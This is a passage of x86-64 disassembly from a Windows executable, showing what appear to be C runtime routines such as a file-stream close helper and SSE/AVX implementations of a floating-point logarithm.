   14000c4bb:	48 89 50 f0          	mov    %rdx,-0x10(%rax)
   14000c4bf:	45 33 c9             	xor    %r9d,%r9d
   14000c4c2:	48 21 48 e8          	and    %rcx,-0x18(%rax)
   14000c4c6:	45 33 c0             	xor    %r8d,%r8d
   14000c4c9:	c6 42 30 01          	movb   $0x1,0x30(%rdx)
   14000c4cd:	c7 42 2c 16 00 00 00 	movl   $0x16,0x2c(%rdx)
   14000c4d4:	33 d2                	xor    %edx,%edx
   14000c4d6:	e8 51 ac ff ff       	call   0x14000712c
   14000c4db:	83 c8 ff             	or     $0xffffffff,%eax
   14000c4de:	eb 54                	jmp    0x14000c534
   14000c4e0:	8b 41 14             	mov    0x14(%rcx),%eax
   14000c4e3:	83 ce ff             	or     $0xffffffff,%esi
   14000c4e6:	c1 e8 0d             	shr    $0xd,%eax
   14000c4e9:	a8 01                	test   $0x1,%al
   14000c4eb:	74 3d                	je     0x14000c52a
   14000c4ed:	e8 7a de ff ff       	call   0x14000a36c
   14000c4f2:	48 8b cb             	mov    %rbx,%rcx
   14000c4f5:	8b f0                	mov    %eax,%esi
   14000c4f7:	e8 98 fb ff ff       	call   0x14000c094
   14000c4fc:	48 8b cb             	mov    %rbx,%rcx
   14000c4ff:	e8 b4 e3 ff ff       	call   0x14000a8b8
   14000c504:	8b c8                	mov    %eax,%ecx
   14000c506:	48 8b d7             	mov    %rdi,%rdx
   14000c509:	e8 1e 0a 00 00       	call   0x14000cf2c
   14000c50e:	85 c0                	test   %eax,%eax
   14000c510:	79 05                	jns    0x14000c517
   14000c512:	83 ce ff             	or     $0xffffffff,%esi
   14000c515:	eb 13                	jmp    0x14000c52a
   14000c517:	48 8b 4b 28          	mov    0x28(%rbx),%rcx
   14000c51b:	48 85 c9             	test   %rcx,%rcx
   14000c51e:	74 0a                	je     0x14000c52a
   14000c520:	e8 c7 af ff ff       	call   0x1400074ec
   14000c525:	48 83 63 28 00       	andq   $0x0,0x28(%rbx)
   14000c52a:	48 8b cb             	mov    %rbx,%rcx
   14000c52d:	e8 8e 0b 00 00       	call   0x14000d0c0
   14000c532:	8b c6                	mov    %esi,%eax
   14000c534:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   14000c539:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   14000c53e:	48 83 c4 30          	add    $0x30,%rsp
   14000c542:	5f                   	pop    %rdi
   14000c543:	c3                   	ret
   14000c544:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000c549:	48 89 7c 24 10       	mov    %rdi,0x10(%rsp)
   14000c54e:	55                   	push   %rbp
   14000c54f:	48 8b ec             	mov    %rsp,%rbp
   14000c552:	48 83 ec 60          	sub    $0x60,%rsp
   14000c556:	48 83 65 c0 00       	andq   $0x0,-0x40(%rbp)
   14000c55b:	83 3d a2 d9 00 00 00 	cmpl   $0x0,0xd9a2(%rip)        # 0x140019f04
   14000c562:	c6 45 d0 00          	movb   $0x0,-0x30(%rbp)
   14000c566:	c6 45 e8 00          	movb   $0x0,-0x18(%rbp)
   14000c56a:	c6 45 f0 00          	movb   $0x0,-0x10(%rbp)
   14000c56e:	c6 45 f8 00          	movb   $0x0,-0x8(%rbp)
   14000c572:	75 10                	jne    0x14000c584
   14000c574:	0f 10 05 dd d1 00 00 	movups 0xd1dd(%rip),%xmm0        # 0x140019758
   14000c57b:	c6 45 e8 01          	movb   $0x1,-0x18(%rbp)
   14000c57f:	f3 0f 7f 45 d8       	movdqu %xmm0,-0x28(%rbp)
   14000c584:	48 8d 55 c0          	lea    -0x40(%rbp),%rdx
   14000c588:	e8 97 fe ff ff       	call   0x14000c424
   14000c58d:	80 7d e8 02          	cmpb   $0x2,-0x18(%rbp)
   14000c591:	8b f8                	mov    %eax,%edi
   14000c593:	75 0b                	jne    0x14000c5a0
   14000c595:	48 8b 4d c0          	mov    -0x40(%rbp),%rcx
   14000c599:	83 a1 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rcx)
   14000c5a0:	80 7d f0 00          	cmpb   $0x0,-0x10(%rbp)
   14000c5a4:	74 0f                	je     0x14000c5b5
   14000c5a6:	8b 5d ec             	mov    -0x14(%rbp),%ebx
   14000c5a9:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   14000c5ad:	e8 3e a0 ff ff       	call   0x1400065f0
   14000c5b2:	89 58 20             	mov    %ebx,0x20(%rax)
   14000c5b5:	80 7d f8 00          	cmpb   $0x0,-0x8(%rbp)
   14000c5b9:	74 0f                	je     0x14000c5ca
   14000c5bb:	8b 5d f4             	mov    -0xc(%rbp),%ebx
   14000c5be:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   14000c5c2:	e8 29 a0 ff ff       	call   0x1400065f0
   14000c5c7:	89 58 24             	mov    %ebx,0x24(%rax)
   14000c5ca:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   14000c5cf:	8b c7                	mov    %edi,%eax
   14000c5d1:	48 8b 7c 24 78       	mov    0x78(%rsp),%rdi
   14000c5d6:	48 83 c4 60          	add    $0x60,%rsp
   14000c5da:	5d                   	pop    %rbp
   14000c5db:	c3                   	ret
   14000c5dc:	cc                   	int3
   14000c5dd:	cc                   	int3
   14000c5de:	cc                   	int3
   14000c5df:	cc                   	int3
   14000c5e0:	48 83 ec 58          	sub    $0x58,%rsp
   14000c5e4:	66 0f 7f 74 24 20    	movdqa %xmm6,0x20(%rsp)
   14000c5ea:	83 3d fb e1 00 00 00 	cmpl   $0x0,0xe1fb(%rip)        # 0x14001a7ec
   14000c5f1:	0f 85 e9 02 00 00    	jne    0x14000c8e0
   14000c5f7:	66 0f 28 d8          	movapd %xmm0,%xmm3
   14000c5fb:	66 0f 28 e0          	movapd %xmm0,%xmm4
   14000c5ff:	66 0f 73 d3 34       	psrlq  $0x34,%xmm3
   14000c604:	66 48 0f 7e c0       	movq   %xmm0,%rax
   14000c609:	66 0f fb 1d 2f 87 00 	psubq  0x872f(%rip),%xmm3        # 0x140014d40
   14000c610:	00 
   14000c611:	66 0f 28 e8          	movapd %xmm0,%xmm5
   14000c615:	66 0f 54 2d f3 86 00 	andpd  0x86f3(%rip),%xmm5        # 0x140014d10
   14000c61c:	00 
   14000c61d:	66 0f 2f 2d eb 86 00 	comisd 0x86eb(%rip),%xmm5        # 0x140014d10
   14000c624:	00 
   14000c625:	0f 84 85 02 00 00    	je     0x14000c8b0
   14000c62b:	66 0f 28 d0          	movapd %xmm0,%xmm2
   14000c62f:	f3 0f e6 f3          	cvtdq2pd %xmm3,%xmm6
   14000c633:	66 0f 57 ed          	xorpd  %xmm5,%xmm5
   14000c637:	66 0f 2f c5          	comisd %xmm5,%xmm0
   14000c63b:	0f 86 2f 02 00 00    	jbe    0x14000c870
   14000c641:	66 0f db 15 17 87 00 	pand   0x8717(%rip),%xmm2        # 0x140014d60
   14000c648:	00 
   14000c649:	f2 0f 5c 25 9f 87 00 	subsd  0x879f(%rip),%xmm4        # 0x140014df0
   14000c650:	00 
   14000c651:	66 0f 2f 35 27 88 00 	comisd 0x8827(%rip),%xmm6        # 0x140014e80
   14000c658:	00 
   14000c659:	0f 84 d8 01 00 00    	je     0x14000c837
   14000c65f:	66 0f 54 25 79 88 00 	andpd  0x8879(%rip),%xmm4        # 0x140014ee0
   14000c666:	00 
   14000c667:	4c 8b c8             	mov    %rax,%r9
   14000c66a:	48 23 05 ff 86 00 00 	and    0x86ff(%rip),%rax        # 0x140014d70
   14000c671:	4c 23 0d 08 87 00 00 	and    0x8708(%rip),%r9        # 0x140014d80
   14000c678:	49 d1 e1             	shl    $1,%r9
   14000c67b:	49 03 c1             	add    %r9,%rax
   14000c67e:	66 48 0f 6e c8       	movq   %rax,%xmm1
   14000c683:	66 0f 2f 25 15 88 00 	comisd 0x8815(%rip),%xmm4        # 0x140014ea0
   14000c68a:	00 
   14000c68b:	0f 82 df 00 00 00    	jb     0x14000c770
   14000c691:	48 c1 e8 2c          	shr    $0x2c,%rax
   14000c695:	66 0f eb 15 63 87 00 	por    0x8763(%rip),%xmm2        # 0x140014e00
   14000c69c:	00 
   14000c69d:	66 0f eb 0d 5b 87 00 	por    0x875b(%rip),%xmm1        # 0x140014e00
   14000c6a4:	00 
   14000c6a5:	4c 8d 0d d4 98 00 00 	lea    0x98d4(%rip),%r9        # 0x140015f80
   14000c6ac:	f2 0f 5c ca          	subsd  %xmm2,%xmm1
   14000c6b0:	f2 41 0f 59 0c c1    	mulsd  (%r9,%rax,8),%xmm1
   14000c6b6:	66 0f 28 d1          	movapd %xmm1,%xmm2
   14000c6ba:	66 0f 28 c1          	movapd %xmm1,%xmm0
   14000c6be:	4c 8d 0d 9b 88 00 00 	lea    0x889b(%rip),%r9        # 0x140014f60
   14000c6c5:	f2 0f 10 1d a3 87 00 	movsd  0x87a3(%rip),%xmm3        # 0x140014e70
   14000c6cc:	00 
   14000c6cd:	f2 0f 10 0d 6b 87 00 	movsd  0x876b(%rip),%xmm1        # 0x140014e40
   14000c6d4:	00 
   14000c6d5:	f2 0f 59 da          	mulsd  %xmm2,%xmm3
   14000c6d9:	f2 0f 59 ca          	mulsd  %xmm2,%xmm1
   14000c6dd:	f2 0f 59 c2          	mulsd  %xmm2,%xmm0
   14000c6e1:	66 0f 28 e0          	movapd %xmm0,%xmm4
   14000c6e5:	f2 0f 58 1d 73 87 00 	addsd  0x8773(%rip),%xmm3        # 0x140014e60
   14000c6ec:	00 
   14000c6ed:	f2 0f 58 0d 3b 87 00 	addsd  0x873b(%rip),%xmm1        # 0x140014e30
   14000c6f4:	00 
   14000c6f5:	f2 0f 59 e0          	mulsd  %xmm0,%xmm4
   14000c6f9:	f2 0f 59 da          	mulsd  %xmm2,%xmm3
   14000c6fd:	f2 0f 59 c8          	mulsd  %xmm0,%xmm1
   14000c701:	f2 0f 58 1d 47 87 00 	addsd  0x8747(%rip),%xmm3        # 0x140014e50
   14000c708:	00 
   14000c709:	f2 0f 58 ca          	addsd  %xmm2,%xmm1
   14000c70d:	f2 0f 59 dc          	mulsd  %xmm4,%xmm3
   14000c711:	f2 0f 58 cb          	addsd  %xmm3,%xmm1
   14000c715:	f2 0f 10 2d b3 86 00 	movsd  0x86b3(%rip),%xmm5        # 0x140014dd0
   14000c71c:	00 
   14000c71d:	f2 0f 59 0d 6b 86 00 	mulsd  0x866b(%rip),%xmm1        # 0x140014d90
   14000c724:	00 
   14000c725:	f2 0f 59 ee          	mulsd  %xmm6,%xmm5
   14000c729:	f2 0f 5c e9          	subsd  %xmm1,%xmm5
   14000c72d:	f2 41 0f 10 04 c1    	movsd  (%r9,%rax,8),%xmm0
   14000c733:	48 8d 15 36 90 00 00 	lea    0x9036(%rip),%rdx        # 0x140015770
   14000c73a:	f2 0f 10 14 c2       	movsd  (%rdx,%rax,8),%xmm2
   14000c73f:	f2 0f 10 25 79 86 00 	movsd  0x8679(%rip),%xmm4        # 0x140014dc0
   14000c746:	00 
   14000c747:	f2 0f 59 e6          	mulsd  %xmm6,%xmm4
   14000c74b:	f2 0f 58 c4          	addsd  %xmm4,%xmm0
   14000c74f:	f2 0f 58 d5          	addsd  %xmm5,%xmm2
   14000c753:	f2 0f 58 c2          	addsd  %xmm2,%xmm0
   14000c757:	66 0f 6f 74 24 20    	movdqa 0x20(%rsp),%xmm6
   14000c75d:	48 83 c4 58          	add    $0x58,%rsp
   14000c761:	c3                   	ret
   14000c762:	66 66 66 66 66 66 0f 	data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   14000c769:	1f 84 00 00 00 00 00 
   14000c770:	f2 0f 10 15 68 86 00 	movsd  0x8668(%rip),%xmm2        # 0x140014de0
   14000c777:	00 
   14000c778:	f2 0f 5c 05 70 86 00 	subsd  0x8670(%rip),%xmm0        # 0x140014df0
   14000c77f:	00 
   14000c780:	f2 0f 58 d0          	addsd  %xmm0,%xmm2
   14000c784:	66 0f 28 c8          	movapd %xmm0,%xmm1
   14000c788:	f2 0f 5e ca          	divsd  %xmm2,%xmm1
   14000c78c:	f2 0f 10 25 6c 87 00 	movsd  0x876c(%rip),%xmm4        # 0x140014f00
   14000c793:	00 
   14000c794:	f2 0f 10 2d 84 87 00 	movsd  0x8784(%rip),%xmm5        # 0x140014f20
   14000c79b:	00 
   14000c79c:	66 0f 28 f0          	movapd %xmm0,%xmm6
   14000c7a0:	f2 0f 59 f1          	mulsd  %xmm1,%xmm6
   14000c7a4:	f2 0f 58 c9          	addsd  %xmm1,%xmm1
   14000c7a8:	66 0f 28 d1          	movapd %xmm1,%xmm2
   14000c7ac:	f2 0f 59 d1          	mulsd  %xmm1,%xmm2
   14000c7b0:	f2 0f 59 e2          	mulsd  %xmm2,%xmm4
   14000c7b4:	f2 0f 59 ea          	mulsd  %xmm2,%xmm5
   14000c7b8:	f2 0f 58 25 30 87 00 	addsd  0x8730(%rip),%xmm4        # 0x140014ef0
   14000c7bf:	00 
   14000c7c0:	f2 0f 58 2d 48 87 00 	addsd  0x8748(%rip),%xmm5        # 0x140014f10
   14000c7c7:	00 
   14000c7c8:	f2 0f 59 d1          	mulsd  %xmm1,%xmm2
   14000c7cc:	f2 0f 59 e2          	mulsd  %xmm2,%xmm4
   14000c7d0:	f2 0f 59 d2          	mulsd  %xmm2,%xmm2
   14000c7d4:	f2 0f 59 d1          	mulsd  %xmm1,%xmm2
   14000c7d8:	f2 0f 59 ea          	mulsd  %xmm2,%xmm5
   14000c7dc:	f2 0f 10 15 cc 85 00 	movsd  0x85cc(%rip),%xmm2        # 0x140014db0
   14000c7e3:	00 
   14000c7e4:	f2 0f 58 e5          	addsd  %xmm5,%xmm4
   14000c7e8:	f2 0f 5c e6          	subsd  %xmm6,%xmm4
   14000c7ec:	f2 0f 10 35 ac 85 00 	movsd  0x85ac(%rip),%xmm6        # 0x140014da0
   14000c7f3:	00 
   14000c7f4:	66 0f 28 d8          	movapd %xmm0,%xmm3
   14000c7f8:	66 0f db 1d 30 87 00 	pand   0x8730(%rip),%xmm3        # 0x140014f30
   14000c7ff:	00 
   14000c800:	f2 0f 5c c3          	subsd  %xmm3,%xmm0
   14000c804:	f2 0f 58 e0          	addsd  %xmm0,%xmm4
   14000c808:	66 0f 28 c3          	movapd %xmm3,%xmm0
   14000c80c:	66 0f 28 cc          	movapd %xmm4,%xmm1
   14000c810:	f2 0f 59 e2          	mulsd  %xmm2,%xmm4
   14000c814:	f2 0f 59 c2          	mulsd  %xmm2,%xmm0
   14000c818:	f2 0f 59 ce          	mulsd  %xmm6,%xmm1
   14000c81c:	f2 0f 59 de          	mulsd  %xmm6,%xmm3
   14000c820:	f2 0f 58 c4          	addsd  %xmm4,%xmm0
   14000c824:	f2 0f 58 c1          	addsd  %xmm1,%xmm0
   14000c828:	f2 0f 58 c3          	addsd  %xmm3,%xmm0
   14000c82c:	66 0f 6f 74 24 20    	movdqa 0x20(%rsp),%xmm6
   14000c832:	48 83 c4 58          	add    $0x58,%rsp
   14000c836:	c3                   	ret
   14000c837:	66 0f eb 15 b1 85 00 	por    0x85b1(%rip),%xmm2        # 0x140014df0
   14000c83e:	00 
   14000c83f:	f2 0f 5c 15 a9 85 00 	subsd  0x85a9(%rip),%xmm2        # 0x140014df0
   14000c846:	00 
   14000c847:	f2 0f 10 ea          	movsd  %xmm2,%xmm5
   14000c84b:	66 0f db 15 0d 85 00 	pand   0x850d(%rip),%xmm2        # 0x140014d60
   14000c852:	00 
   14000c853:	66 48 0f 7e d0       	movq   %xmm2,%rax
   14000c858:	66 0f 73 d5 34       	psrlq  $0x34,%xmm5
   14000c85d:	66 0f fa 2d 2b 86 00 	psubd  0x862b(%rip),%xmm5        # 0x140014e90
   14000c864:	00 
   14000c865:	f3 0f e6 f5          	cvtdq2pd %xmm5,%xmm6
   14000c869:	e9 f1 fd ff ff       	jmp    0x14000c65f
   14000c86e:	66 90                	xchg   %ax,%ax
   14000c870:	75 1e                	jne    0x14000c890
   14000c872:	f2 0f 10 0d 86 84 00 	movsd  0x8486(%rip),%xmm1        # 0x140014d00
   14000c879:	00 
   14000c87a:	44 8b 05 bf 86 00 00 	mov    0x86bf(%rip),%r8d        # 0x140014f40
   14000c881:	e8 1a 0b 00 00       	call   0x14000d3a0
   14000c886:	eb 48                	jmp    0x14000c8d0
   14000c888:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000c88f:	00 
   14000c890:	f2 0f 10 0d 88 84 00 	movsd  0x8488(%rip),%xmm1        # 0x140014d20
   14000c897:	00 
   14000c898:	44 8b 05 a5 86 00 00 	mov    0x86a5(%rip),%r8d        # 0x140014f44
   14000c89f:	e8 fc 0a 00 00       	call   0x14000d3a0
   14000c8a4:	eb 2a                	jmp    0x14000c8d0
   14000c8a6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000c8ad:	00 00 00 
   14000c8b0:	48 3b 05 59 84 00 00 	cmp    0x8459(%rip),%rax        # 0x140014d10
   14000c8b7:	74 17                	je     0x14000c8d0
   14000c8b9:	48 3b 05 40 84 00 00 	cmp    0x8440(%rip),%rax        # 0x140014d00
   14000c8c0:	74 ce                	je     0x14000c890
   14000c8c2:	48 0b 05 67 84 00 00 	or     0x8467(%rip),%rax        # 0x140014d30
   14000c8c9:	66 48 0f 6e c0       	movq   %rax,%xmm0
   14000c8ce:	66 90                	xchg   %ax,%ax
   14000c8d0:	66 0f 6f 74 24 20    	movdqa 0x20(%rsp),%xmm6
   14000c8d6:	48 83 c4 58          	add    $0x58,%rsp
   14000c8da:	c3                   	ret
   14000c8db:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000c8e0:	48 33 c0             	xor    %rax,%rax
   14000c8e3:	c5 e1 73 d0 34       	vpsrlq $0x34,%xmm0,%xmm3
   14000c8e8:	c4 e1 f9 7e c0       	vmovq  %xmm0,%rax
   14000c8ed:	c5 e1 fb 1d 4b 84 00 	vpsubq 0x844b(%rip),%xmm3,%xmm3        # 0x140014d40
   14000c8f4:	00 
   14000c8f5:	c5 fa e6 f3          	vcvtdq2pd %xmm3,%xmm6
   14000c8f9:	c5 f9 db 2d 0f 84 00 	vpand  0x840f(%rip),%xmm0,%xmm5        # 0x140014d10
   14000c900:	00 
   14000c901:	c5 f9 2f 2d 07 84 00 	vcomisd 0x8407(%rip),%xmm5        # 0x140014d10
   14000c908:	00 
   14000c909:	0f 84 41 02 00 00    	je     0x14000cb50
   14000c90f:	c5 d1 ef ed          	vpxor  %xmm5,%xmm5,%xmm5
   14000c913:	c5 f9 2f c5          	vcomisd %xmm5,%xmm0
   14000c917:	0f 86 e3 01 00 00    	jbe    0x14000cb00
   14000c91d:	c5 f9 db 15 3b 84 00 	vpand  0x843b(%rip),%xmm0,%xmm2        # 0x140014d60
   14000c924:	00 
   14000c925:	c5 fb 5c 25 c3 84 00 	vsubsd 0x84c3(%rip),%xmm0,%xmm4        # 0x140014df0
   14000c92c:	00 
   14000c92d:	c5 f9 2f 35 4b 85 00 	vcomisd 0x854b(%rip),%xmm6        # 0x140014e80
   14000c934:	00 
   14000c935:	0f 84 8e 01 00 00    	je     0x14000cac9
   14000c93b:	c5 f9 db 0d 2d 84 00 	vpand  0x842d(%rip),%xmm0,%xmm1        # 0x140014d70
   14000c942:	00 
   14000c943:	c5 f9 db 1d 35 84 00 	vpand  0x8435(%rip),%xmm0,%xmm3        # 0x140014d80
   14000c94a:	00 
   14000c94b:	c5 e1 73 f3 01       	vpsllq $0x1,%xmm3,%xmm3
   14000c950:	c5 e1 d4 c9          	vpaddq %xmm1,%xmm3,%xmm1
   14000c954:	c4 e1 f9 7e c8       	vmovq  %xmm1,%rax
   14000c959:	c5 d9 db 25 7f 85 00 	vpand  0x857f(%rip),%xmm4,%xmm4        # 0x140014ee0
   14000c960:	00 
   14000c961:	c5 f9 2f 25 37 85 00 	vcomisd 0x8537(%rip),%xmm4        # 0x140014ea0
   14000c968:	00 
   14000c969:	0f 82 b1 00 00 00    	jb     0x14000ca20
   14000c96f:	48 c1 e8 2c          	shr    $0x2c,%rax
   14000c973:	c5 e9 eb 15 85 84 00 	vpor   0x8485(%rip),%xmm2,%xmm2        # 0x140014e00
   14000c97a:	00 
   14000c97b:	c5 f1 eb 0d 7d 84 00 	vpor   0x847d(%rip),%xmm1,%xmm1        # 0x140014e00
   14000c982:	00 
   14000c983:	4c 8d 0d f6 95 00 00 	lea    0x95f6(%rip),%r9        # 0x140015f80
   14000c98a:	c5 f3 5c ca          	vsubsd %xmm2,%xmm1,%xmm1
   14000c98e:	c4 c1 73 59 0c c1    	vmulsd (%r9,%rax,8),%xmm1,%xmm1
   14000c994:	4c 8d 0d c5 85 00 00 	lea    0x85c5(%rip),%r9        # 0x140014f60
   14000c99b:	c5 f3 59 c1          	vmulsd %xmm1,%xmm1,%xmm0
   14000c99f:	c5 fb 10 1d c9 84 00 	vmovsd 0x84c9(%rip),%xmm3        # 0x140014e70
   14000c9a6:	00 
   14000c9a7:	c5 fb 10 2d 91 84 00 	vmovsd 0x8491(%rip),%xmm5        # 0x140014e40
   14000c9ae:	00 
   14000c9af:	c4 e2 f1 a9 1d a8 84 	vfmadd213sd 0x84a8(%rip),%xmm1,%xmm3        # 0x140014e60
   14000c9b6:	00 00 
   14000c9b8:	c4 e2 f1 a9 2d 3f 84 	vfmadd213sd 0x843f(%rip),%xmm1,%xmm5        # 0x140014e00
   14000c9bf:	00 00 
   14000c9c1:	f2 0f 10 e0          	movsd  %xmm0,%xmm4
   14000c9c5:	c4 e2 f1 a9 1d 82 84 	vfmadd213sd 0x8482(%rip),%xmm1,%xmm3        # 0x140014e50
   14000c9cc:	00 00 
   14000c9ce:	c5 fb 59 e0          	vmulsd %xmm0,%xmm0,%xmm4
   14000c9d2:	c4 e2 d1 b9 c8       	vfmadd231sd %xmm0,%xmm5,%xmm1
   14000c9d7:	c4 e2 e1 b9 cc       	vfmadd231sd %xmm4,%xmm3,%xmm1
   14000c9dc:	c5 f3 59 0d ac 83 00 	vmulsd 0x83ac(%rip),%xmm1,%xmm1        # 0x140014d90
   14000c9e3:	00 
   14000c9e4:	c5 fb 10 2d e4 83 00 	vmovsd 0x83e4(%rip),%xmm5        # 0x140014dd0
   14000c9eb:	00 
   14000c9ec:	c4 e2 c9 ab e9       	vfmsub213sd %xmm1,%xmm6,%xmm5
   14000c9f1:	f2 41 0f 10 04 c1    	movsd  (%r9,%rax,8),%xmm0
   14000c9f7:	48 8d 15 72 8d 00 00 	lea    0x8d72(%rip),%rdx        # 0x140015770
   14000c9fe:	f2 0f 10 14 c2       	movsd  (%rdx,%rax,8),%xmm2
   14000ca03:	c5 eb 58 d5          	vaddsd %xmm5,%xmm2,%xmm2
   14000ca07:	c4 e2 c9 b9 05 b0 83 	vfmadd231sd 0x83b0(%rip),%xmm6,%xmm0        # 0x140014dc0
   14000ca0e:	00 00 
   14000ca10:	c5 fb 58 c2          	vaddsd %xmm2,%xmm0,%xmm0
   14000ca14:	c5 f9 6f 74 24 20    	vmovdqa 0x20(%rsp),%xmm6
   14000ca1a:	48 83 c4 58          	add    $0x58,%rsp
   14000ca1e:	c3                   	ret
   14000ca1f:	90                   	nop
   14000ca20:	c5 fb 10 15 b8 83 00 	vmovsd 0x83b8(%rip),%xmm2        # 0x140014de0
   14000ca27:	00 
   14000ca28:	c5 fb 5c 05 c0 83 00 	vsubsd 0x83c0(%rip),%xmm0,%xmm0        # 0x140014df0
   14000ca2f:	00 
   14000ca30:	c5 eb 58 d0          	vaddsd %xmm0,%xmm2,%xmm2
   14000ca34:	c5 fb 5e ca          	vdivsd %xmm2,%xmm0,%xmm1
   14000ca38:	c5 fb 10 25 c0 84 00 	vmovsd 0x84c0(%rip),%xmm4        # 0x140014f00
   14000ca3f:	00 
   14000ca40:	c5 fb 10 2d d8 84 00 	vmovsd 0x84d8(%rip),%xmm5        # 0x140014f20
   14000ca47:	00 
   14000ca48:	c5 fb 59 f1          	vmulsd %xmm1,%xmm0,%xmm6
   14000ca4c:	c5 f3 58 c9          	vaddsd %xmm1,%xmm1,%xmm1
   14000ca50:	c5 f3 59 d1          	vmulsd %xmm1,%xmm1,%xmm2
   14000ca54:	c4 e2 e9 a9 25 93 84 	vfmadd213sd 0x8493(%rip),%xmm2,%xmm4        # 0x140014ef0
   14000ca5b:	00 00 
   14000ca5d:	c4 e2 e9 a9 2d aa 84 	vfmadd213sd 0x84aa(%rip),%xmm2,%xmm5        # 0x140014f10
   14000ca64:	00 00 
   14000ca66:	c5 eb 59 d1          	vmulsd %xmm1,%xmm2,%xmm2
   14000ca6a:	c5 db 59 e2          	vmulsd %xmm2,%xmm4,%xmm4
   14000ca6e:	c5 eb 59 d2          	vmulsd %xmm2,%xmm2,%xmm2
   14000ca72:	c5 eb 59 d1          	vmulsd %xmm1,%xmm2,%xmm2
   14000ca76:	c5 d3 59 ea          	vmulsd %xmm2,%xmm5,%xmm5
   14000ca7a:	c5 db 58 e5          	vaddsd %xmm5,%xmm4,%xmm4
   14000ca7e:	c5 db 5c e6          	vsubsd %xmm6,%xmm4,%xmm4
   14000ca82:	c5 f9 db 1d a6 84 00 	vpand  0x84a6(%rip),%xmm0,%xmm3        # 0x140014f30
   14000ca89:	00 
   14000ca8a:	c5 fb 5c c3          	vsubsd %xmm3,%xmm0,%xmm0
   14000ca8e:	c5 db 58 e0          	vaddsd %xmm0,%xmm4,%xmm4
   14000ca92:	c5 db 59 0d 06 83 00 	vmulsd 0x8306(%rip),%xmm4,%xmm1        # 0x140014da0
   14000ca99:	00 
   14000ca9a:	c5 db 59 25 0e 83 00 	vmulsd 0x830e(%rip),%xmm4,%xmm4        # 0x140014db0
   14000caa1:	00 
   14000caa2:	c5 e3 59 05 06 83 00 	vmulsd 0x8306(%rip),%xmm3,%xmm0        # 0x140014db0
   14000caa9:	00 
   14000caaa:	c5 e3 59 1d ee 82 00 	vmulsd 0x82ee(%rip),%xmm3,%xmm3        # 0x140014da0
   14000cab1:	00 
   14000cab2:	c5 fb 58 c4          	vaddsd %xmm4,%xmm0,%xmm0
   14000cab6:	c5 fb 58 c1          	vaddsd %xmm1,%xmm0,%xmm0
   14000caba:	c5 fb 58 c3          	vaddsd %xmm3,%xmm0,%xmm0
   14000cabe:	c5 f9 6f 74 24 20    	vmovdqa 0x20(%rsp),%xmm6
   14000cac4:	48 83 c4 58          	add    $0x58,%rsp
   14000cac8:	c3                   	ret
   14000cac9:	c5 e9 eb 15 1f 83 00 	vpor   0x831f(%rip),%xmm2,%xmm2        # 0x140014df0
   14000cad0:	00 
   14000cad1:	c5 eb 5c 15 17 83 00 	vsubsd 0x8317(%rip),%xmm2,%xmm2        # 0x140014df0
   14000cad8:	00 
   14000cad9:	c5 d1 73 d2 34       	vpsrlq $0x34,%xmm2,%xmm5
   14000cade:	c5 e9 db 15 7a 82 00 	vpand  0x827a(%rip),%xmm2,%xmm2        # 0x140014d60
   14000cae5:	00 
   14000cae6:	c5 f9 28 c2          	vmovapd %xmm2,%xmm0
   14000caea:	c5 d1 fa 2d 9e 83 00 	vpsubd 0x839e(%rip),%xmm5,%xmm5        # 0x140014e90
   14000caf1:	00 
   14000caf2:	c5 fa e6 f5          	vcvtdq2pd %xmm5,%xmm6
   14000caf6:	e9 40 fe ff ff       	jmp    0x14000c93b
   14000cafb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000cb00:	75 2e                	jne    0x14000cb30
   14000cb02:	c5 fb 10 0d f6 81 00 	vmovsd 0x81f6(%rip),%xmm1        # 0x140014d00
   14000cb09:	00 
   14000cb0a:	44 8b 05 2f 84 00 00 	mov    0x842f(%rip),%r8d        # 0x140014f40
   14000cb11:	e8 8a 08 00 00       	call   0x14000d3a0
   14000cb16:	c5 f9 6f 74 24 20    	vmovdqa 0x20(%rsp),%xmm6
   14000cb1c:	48 83 c4 58          	add    $0x58,%rsp
   14000cb20:	c3                   	ret
   14000cb21:	66 66 66 66 66 66 66 	data16 data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   14000cb28:	0f 1f 84 00 00 00 00 
   14000cb2f:	00 
   14000cb30:	c5 fb 10 0d e8 81 00 	vmovsd 0x81e8(%rip),%xmm1        # 0x140014d20
   14000cb37:	00 
   14000cb38:	44 8b 05 05 84 00 00 	mov    0x8405(%rip),%r8d        # 0x140014f44
   14000cb3f:	e8 5c 08 00 00       	call   0x14000d3a0
   14000cb44:	c5 f9 6f 74 24 20    	vmovdqa 0x20(%rsp),%xmm6
   14000cb4a:	48 83 c4 58          	add    $0x58,%rsp
   14000cb4e:	c3                   	ret
   14000cb4f:	90                   	nop
   14000cb50:	48 3b 05 b9 81 00 00 	cmp    0x81b9(%rip),%rax        # 0x140014d10
   14000cb57:	74 27                	je     0x14000cb80
   14000cb59:	48 3b 05 a0 81 00 00 	cmp    0x81a0(%rip),%rax        # 0x140014d00
   14000cb60:	74 ce                	je     0x14000cb30
   14000cb62:	48 0b 05 c7 81 00 00 	or     0x81c7(%rip),%rax        # 0x140014d30
   14000cb69:	66 48 0f 6e c8       	movq   %rax,%xmm1
   14000cb6e:	44 8b 05 d3 83 00 00 	mov    0x83d3(%rip),%r8d        # 0x140014f48
   14000cb75:	e8 26 08 00 00       	call   0x14000d3a0
   14000cb7a:	eb 04                	jmp    0x14000cb80
   14000cb7c:	0f 1f 40 00          	nopl   0x0(%rax)
   14000cb80:	c5 f9 6f 74 24 20    	vmovdqa 0x20(%rsp),%xmm6
   14000cb86:	48 83 c4 58          	add    $0x58,%rsp
   14000cb8a:	c3                   	ret
   14000cb8b:	cc                   	int3
   14000cb8c:	48 83 22 00          	andq   $0x0,(%rdx)
   14000cb90:	48 8b c1             	mov    %rcx,%rax
   14000cb93:	c3                   	ret
